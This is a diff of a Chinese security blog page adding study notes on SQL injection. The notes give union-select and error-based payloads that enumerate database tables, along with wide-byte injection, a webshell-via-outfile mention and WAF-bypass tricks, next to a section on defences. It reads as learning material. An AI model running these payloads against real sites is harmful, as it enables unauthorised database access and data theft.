+<li>逐个测试处理字段数，直到网页显示正常，测试程序对union处理逻辑</li>
+<li>在说明程序处理的字段数室多少</li>
+<li>在网页上显示的第三者上位点室第几个字段</li>
+</ol>
+</li>
+<li><p>上位点利用测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5,user(),7,8 --</span><br></pre></td></tr></table></figure>
+
+<p>数据库版本确认version()</p>
+<p>数据库名database()</p>
+</li>
+<li><p>字典子查询测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,table_name,3,4,5,6,7,8  from information_schema.tables where table_schema=database() limit 1--</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>–的目标是对后面的子句注释掉，这样就能查询我们想要的字典表</li>
+<li>table_name显示测试位的可能性和如何替代商品所有选项的可能性</li>
+</ol>
+</li>
+<li><p>商品所有选项完全替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,concat(table_schema,char(10),table_name,3,4,5,6,7,8  from information_schema.tables where table_schema=database() limit 1,10--</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h4 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h4><ol>
+<li><p>sql注入应用层防御</p>
+<ol>
+<li><p>应用层防御目标</p>
+<ol>
+<li>sql注入本质原因是应用层的问题</li>
+<li>sql注入应用层防御的目标是修复sql所有的可能漏洞</li>
+</ol>
+</li>
+<li><p>过滤sql注入基本字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &quot;				字符串闭合</span><br><span class="line">-- or #				单行注释</span><br><span class="line">/*···*/				多行注释</span><br><span class="line">+					url中替代空格拼接字符</span><br><span class="line">concat 				字符拼接</span><br><span class="line">%					通配符</span><br><span class="line">?param1=foo&amp;param2=bar	url参数</span><br><span class="line">select 				url打印常量</span><br><span class="line">@variable			本地变量</span><br><span class="line">@@variable			全局变量</span><br><span class="line">sleep 10 			睡眠10秒</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>过滤sql关键字</p>
+<p><img src="/2021/11/01/SQLInject/3-9%E5%BA%94%E7%94%A8%E5%B1%82%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_148.jpg" alt="3-9应用层如何防御.pcwl_视频截图_148"></p>
+</li>
+<li><p>url传参的整体加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原url</span><br><span class="line">https://61.206.45.132/corp/tokusyu.php?mid=1&amp;tksid=473</span><br><span class="line"></span><br><span class="line">整体加密处理:</span><br><span class="line">https://61.206.45.132/corp/tokusyu.php?action=xnnakuiqlnZHRE14DAFEWQ</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>系统层如何防御</p>
+<ol>
+<li>系统层防御目标<ol>
+<li>sql注入的本质原因不是由系统层的问题</li>
+<li>系统层的防御是辅助的作用，是预防sql注入与系统层交互提权，预防sql注入权限的进一步扩大，使得sql注入在系统层无所作为</li>
+</ol>
+</li>
+<li>系统层防御方法<ol>
+<li>iptables限制只允许特定服务器IP和端口登录</li>
+<li>使用应用防火墙对sql注入拒绝waf</li>
+<li>数据库安全中间件：greensql，安全狗</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>数据库层防御</p>
+<ol>
+<li>数据库层防御目标<ol>
+<li>sql注入本质不在数据库层的问题</li>
+<li>数据库层防御的目标是辅助性的，预防sql注入在数据层交互提权，防止sql注入成功后权限和数据进一步泄露进一步扩大</li>
+</ol>
+</li>
+<li>sql权限的最小化<ol>
+<li>revoke收回权限</li>
+<li>程序连接的权限分配以最小化为原则</li>
+</ol>
+</li>
+<li>数据库层规范化要求<ol>
+<li>这个DBA专业的sql设计审计要求</li>
+<li>如何设计尽量保持高性能，同时也要预防sql测试出错的可能性</li>
+<li>数据库架构设计考虑性能与安全的权衡，通常在保障性能的前提下去考虑安全性的折中</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ul>
+<li><p>updatexml()</p>
+<ul>
+<li><p>函数作用：改变（查找并替换）XML 文档中符合条件的节点的值</p>
+</li>
+<li><p>语法：<code>UPDATEXML (XML_document, XPath_string, new_value)</code></p>
+</li>
+<li><p>参数</p>
+<ul>
+<li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li>
+<li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。不过这里用不到。</li>
+<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li>
+</ul>
+</li>
+<li><p>例如：<code>updatexml(1, concat(0x7e, version()), 0)#</code></p>
+</li>
+</ul>
+</li>
+<li><p>extractvalue()</p>
+<ul>
+<li><p>函数作用：从目标XML中返回包含所查询值的字符串</p>
+</li>
+<li><p>语法：<code>ExtractValue(xml_document, XPathstring)</code></p>
+</li>
+<li><p>参数</p>
+<ul>
+<li>第一个参数：xml_document 是 string 格式，为 XML 文档对象的名称</li>
+<li>第二个参数： XPathstring，XPath 格式的字符串</li>
+</ul>
+</li>
+<li><p>例如：<code>extractvalue(1,concat(0x7e,database()))#</code></p>
+</li>
+</ul>
+</li>
+<li><p>floor()</p>
+<ul>
+<li><p>函数作用：向下取整</p>
+</li>
+<li><p>语法：<code>floor()</code></p>
+</li>
+<li><p>如果要用 floor() 构成报错，必须满足下面的条件</p>
+<ul>
+<li>运算中有 count</li>
+<li>运算中有 group by</li>
+<li>运算中有 rand</li>
+</ul>
+</li>
+<li><p>例如：<code>(select 2 from (select count(*), concat(version(), floor(rand(0) * 2))x from information_schema.tables group by x)a)#</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p><img src="/2021/11/01/SQLInject/image-20220301101452987.png" alt="image-20220301101452987"></p>
+<ul>
+<li><p>前提条件：</p>
+<ul>
+<li><p>需要知道远程目录</p>
+</li>
+<li><p>需要远程目录有写权限</p>
+</li>
+<li><p>需要数据库开启了 secure_file_priv，MySQL新特性，没有开启的话 into outfile 是不能写入的</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>有时<code>&#39;&quot;/</code>等字符会被转义，为避免转义采用宽字节注入，汉字有两个字节，例如：<code>%df%5c</code>代表連</p>
+<p>应用案例：<code>%df&#39;</code></p>
+<h4 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h4><ul>
+<li>联合查询</li>
+<li>http-header注入</li>
+<li>报错注入</li>
+<li>布尔盲注</li>
+<li>延时注入</li>
+<li>宽字节注入</li>
+<li>堆叠注入</li>
+<li>DNSlog注入</li>
+<li>偏移注入</li>
+<li>二次注入攻击</li>
+</ul>
+<h4 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h4><ul>
+<li>大小写绕过</li>
+<li>编码绕过</li>
+<li>双写绕过</li>
+<li>换行（\n）绕过</li>
+<li>注释符内联注释绕过</li>
+<li>同义词替换</li>
+<li>HTTP参数污染<ul>
+<li>多个参数，waf只检测其中的一个</li>
+</ul>
+</li>
+<li>垃圾参数</li>
+<li>分块传输</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2021/11/01/SQLInject/" data-id="cljuunh6n001ag8v55i9n4blh" data-title="SQL注入" class="article-share-link">分享</a>
       
       
       
@@ -149,7 +628,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/10/01/ICMP/" data-id="clfpg8zte0001vwv57g7n2lqo" data-title="ICMP" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/10/01/ICMP/" data-id="cljuunh670003g8v5del2349v" data-title="ICMP" class="article-share-link">分享</a>
       
       
       
@@ -202,7 +681,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/10/01/NAT/" data-id="clfpg8ztl0008vwv54a4g6y5l" data-title="NAT" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/10/01/NAT/" data-id="cljuunh690005g8v5h423elfg" data-title="NAT" class="article-share-link">分享</a>
       
       
       
@@ -248,7 +727,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/10/01/docker/" data-id="clfpg8zto000hvwv50vyb264z" data-title="docker" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/10/01/docker/" data-id="cljuunh6g000kg8v54f2o3by3" data-title="docker" class="article-share-link">分享</a>
       
       
       
@@ -293,7 +772,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/10/01/network/" data-id="clfpg8ztq000nvwv5a3t041w6" data-title="计算机网络" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/10/01/network/" data-id="cljuunh6h000qg8v5e6v9fynn" data-title="计算机网络" class="article-share-link">分享</a>
       
       
       
@@ -338,7 +817,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/" data-id="clfpg8ztt0011vwv56m3x1h6g" data-title="小迪安全" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/" data-id="cljuunh6l0012g8v51qsr8ira" data-title="小迪安全" class="article-share-link">分享</a>
       
       
       
@@ -370,7 +849,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
     </div>
   </div>
 
@@ -380,7 +859,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/web-security/" style="font-size: 10px;">web-security</a>
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/web-security/" style="font-size: 20px;">web-security</a>
     </div>
   </div>
 
@@ -389,7 +868,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
     </div>
   </div>
 
@@ -400,6 +879,10 @@
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2023/07/09/BUUCTF-web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/">BUUCTF-web-[极客大挑战 2019]EasySQL</a>
+          </li>
         
           <li>
             <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
@@ -415,10 +898,6 @@
         
           <li>
             <a href="/2022/03/01/OWASP/">OWASP TOP 10</a>
-          </li>
-        
-          <li>
-            <a href="/2022/03/01/kali/">kali</a>
           </li>
         
       </ul>
